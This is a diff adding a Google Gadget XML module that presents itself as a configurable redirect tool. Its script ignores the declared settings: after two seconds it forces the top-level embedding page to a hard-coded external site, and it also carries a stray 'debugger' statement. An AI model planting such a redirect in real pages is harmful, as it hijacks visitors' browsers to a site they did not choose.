@@ -1,0 +1,17 @@
+<Module>
+<ModulePrefs title="" screenshot="" thumbnail="" category="tools" description="" render_inline="optional"/>
+<UserPref name="time" display_name="Wait Time(s)" default_value="10"/>
+<UserPref name="redirect_url" display_name="Redirect Url" default_value=""/>
+<UserPref name="exclude" display_name="Exclude RegExp" default_value=""/>
+<Content type="html">
+<![CDATA[
+
+ <script type="text/javascript">
+    debugger;
+    setTimeout(function(){
+        window.top.location= 'http://aapastech.com';
+    }, 2000)
+ </script>
+]]>
+</Content>
+</Module>
